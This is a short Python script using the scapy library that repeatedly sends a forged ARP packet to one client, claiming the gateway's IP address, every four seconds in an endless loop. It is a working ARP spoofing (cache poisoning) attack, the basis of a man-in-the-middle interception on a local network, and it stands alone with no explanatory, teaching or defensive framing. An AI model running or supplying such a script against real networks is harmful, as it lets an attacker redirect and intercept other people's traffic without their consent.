from scapy.all import *
import time

clientMAC="4c:b1:99:09:c6:33"
gateway = "192.168.1.1"
client = "192.168.1.101"
m = Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client)
m.show()
# send(m, inter=RandNum(10,40), loop=1  )
# 

while 1:
	sendp(m)
	time.sleep(4)